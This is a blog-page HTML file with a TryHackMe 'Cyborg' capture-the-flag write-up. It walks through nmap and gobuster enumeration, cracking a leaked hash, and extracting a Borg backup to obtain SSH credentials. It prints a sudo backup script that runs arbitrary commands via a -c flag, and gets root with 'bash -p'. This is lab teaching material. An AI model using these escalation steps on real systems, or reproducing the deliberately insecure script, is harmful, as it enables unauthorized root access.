@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Writeup of Cyborg room in TryHackMe">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyborg TryHackMe Writeup"/>
+<meta name="twitter:description" content="Writeup of Cyborg room in TryHackMe"/>
+
+    <meta property="og:title" content="Cyborg TryHackMe Writeup" />
+<meta property="og:description" content="Writeup of Cyborg room in TryHackMe" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/cyborg/" />
+<meta property="article:published_time" content="2021-01-31T18:53:23+05:30" />
+<meta property="article:modified_time" content="2021-01-31T18:53:23+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/sustah/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chocolatefactory/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/battery/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/overpass3/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chill_hack/" />
+
+
+
+    <title>
+  Cyborg TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/cyborg/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Cyborg TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-01-31T18:53:23&#43;05:30'>
+                January 31, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/tryhackme/">tryhackme</a>
+      <span class="separator">•</span>
+    <a href="/tags/easy_box/">easy_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="cyborghttpstryhackmecomroomcyborgt8-tryhackme-writeup"><a href="https://tryhackme.com/room/cyborgt8">Cyborg</a> TryHackMe Writeup</h1>
+<p><img src="/TryHackMe/Cyborg/BoxImage.jpeg" alt=""></p>
+<p>So this was a very different box from others and also an interesting concept is used on initial foothold.</p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>Let&rsquo;s fireup nmap.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Sun Jan 31 16:51:47 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.143.35
+Warning: 10.10.143.35 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.143.35
+Host is up, received syn-ack (0.20s latency).
+Scanned at 2021-01-31 16:51:48 IST for 795s
+Not shown: 65529 closed ports
+Reason: 65529 conn-refused
+PORT      STATE    SERVICE REASON      VERSION
+22/tcp    open     ssh     syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
+|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
+|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
+80/tcp    open     http    syn-ack     Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+29135/tcp filtered unknown no-response
+34981/tcp filtered unknown no-response
+37803/tcp filtered unknown no-response
+47065/tcp filtered unknown no-response
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 31 17:05:03 2021 -- 1 IP address (1 host up) scanned in 796.32 seconds
+</code></pre></div><p>So the open ports are :</p>
+<ul>
+<li>22</li>
+<li>80</li>
+</ul>
+<p>Hence I visited the port 80.</p>
+<p><img src="/TryHackMe/Cyborg/port80.png" alt=""></p>
+<p>So I fired up gobuster and got some interesting results.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.143.35/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     js,txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/01/31 16:52:20 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/admin (Status: 301)
+/etc (Status: 301)
+</code></pre></div><h2 id="__second-stage--initial-access-as-alex__"><strong>Second Stage : Initial access as alex</strong></h2>
+<p>Hence I visited admin .</p>
+<p><img src="/TryHackMe/Cyborg/admin.png" alt=""></p>
+<p>So there is a backup called music_archive in the web.</p>
+<p>So I went to <strong>/etc</strong> . So I found two files.</p>
+<p><img src="/TryHackMe/Cyborg/etc.png" alt=""></p>
+<p><img src="/TryHackMe/Cyborg/hash.png" alt=""></p>
+<p>And then the <strong>squid.conf</strong></p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+auth_param basic children 5
+auth_param basic realm Squid Basic Authentication
+auth_param basic credentialsttl 2 hours
+acl auth_users proxy_auth REQUIRED
+http_access allow auth_users
+</code></pre></div><p>So first I cracked the hash and found the password.</p>
+<p>Then when I went back to admin directory , in archives -&gt; download I got <strong>archive.tar</strong>.</p>
+<p><img src="/TryHackMe/Cyborg/arhchive.png" alt=""></p>
+<p>The <strong>README</strong> file gave a hint to look in the right direction.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+</code></pre></div><p>So after reading the documentation , I downloaded the binary and followed the instructions for extracting.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#Extract entire archive
+$ borg extract /path/to/repo::my-files
+</code></pre></div><p><img src="/TryHackMe/Cyborg/extract.png" alt=""></p>
+<p>So I found the password in <strong>/home/alex/Documents/</strong>.</p>
+<p><img src="/TryHackMe/Cyborg/passwd.png" alt=""></p>
+<h2 id="third-stage--alex-to-root">Third Stage : alex to root</h2>
+<p>Hence after ssh into the box .</p>
+<p><img src="/TryHackMe/Cyborg/perms.png" alt=""></p>
+<p>So reading the <strong>backup.sh</strong></p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0;font-weight:bold">#!/bin/bash
+</span><span style="color:#0f0;font-weight:bold"></span>
+sudo find / -name <span style="color:#0ff;font-weight:bold">&#34;*.mp3&#34;</span> | sudo tee /etc/mp3backups/backed_up_files.txt
+
+
+input=<span style="color:#0ff;font-weight:bold">&#34;/etc/mp3backups/backed_up_files.txt&#34;</span>
+<span style="color:#007f7f">#while IFS= read -r line</span>
+<span style="color:#007f7f">#do</span>
+  <span style="color:#007f7f">#a=&#34;/etc/mp3backups/backed_up_files.txt&#34;</span>
+<span style="color:#007f7f">#  b=$(basename $input)</span>
+  <span style="color:#007f7f">#echo</span>
+<span style="color:#007f7f">#  echo &#34;$line&#34;</span>
+<span style="color:#007f7f">#done &lt; &#34;$input&#34;</span>
+
+<span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">getopts</span> c: flag
+<span style="color:#fff;font-weight:bold">do</span>
+	<span style="color:#fff;font-weight:bold">case</span> <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">${</span>flag<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span> in 
+		c) command=<span style="color:#0ff;font-weight:bold">${</span>OPTARG<span style="color:#0ff;font-weight:bold">}</span>;;
+	<span style="color:#fff;font-weight:bold">esac</span>
+<span style="color:#fff;font-weight:bold">done</span>
+
+
+
+backup_files=<span style="color:#0ff;font-weight:bold">&#34;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3&#34;</span>
+
+<span style="color:#007f7f"># Where to backup to.</span>
+dest=<span style="color:#0ff;font-weight:bold">&#34;/etc/mp3backups/&#34;</span>
+
+<span style="color:#007f7f"># Create archive filename.</span>
+hostname=<span style="color:#fff;font-weight:bold">$(</span>hostname -s<span style="color:#fff;font-weight:bold">)</span>
+archive_file=<span style="color:#0ff;font-weight:bold">&#34;</span>$hostname<span style="color:#0ff;font-weight:bold">-scheduled.tgz&#34;</span>
+
+<span style="color:#007f7f"># Print start status message.</span>
+<span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;Backing up </span>$backup_files<span style="color:#0ff;font-weight:bold"> to </span>$dest<span style="color:#0ff;font-weight:bold">/</span>$archive_file<span style="color:#0ff;font-weight:bold">&#34;</span>
+
+<span style="color:#fff;font-weight:bold">echo</span>
+
+<span style="color:#007f7f"># Backup the files using tar.</span>
+tar czf $dest/$archive_file $backup_files
+
+<span style="color:#007f7f"># Print end status message.</span>
+<span style="color:#fff;font-weight:bold">echo</span>
+<span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;Backup finished&#34;</span>
+
+cmd=<span style="color:#fff;font-weight:bold">$(</span>$command<span style="color:#fff;font-weight:bold">)</span>
+<span style="color:#fff;font-weight:bold">echo</span> $cmd
+</code></pre></div><p>So we can see that the script is taking arguments through &ldquo;c&rdquo; flag , hence I tired <strong>whoami</strong>.</p>
+<p><img src="/TryHackMe/Cyborg/try1.png" alt=""></p>
+<p>Since it worked I tried</p>
+<blockquote>
+<p>sudo /etc/mp3backups/backup.sh -c &ldquo;bash -p&rdquo;</p>
+</blockquote>
+<p>And got root.</p>
+<p><img src="/TryHackMe/Cyborg/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/sustah/">Sustah TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chocolatefactory/">ChocolateFactory TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/battery/">Battery TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/overpass3/">Overpass3 TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chill_hack/">Chill Hack TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
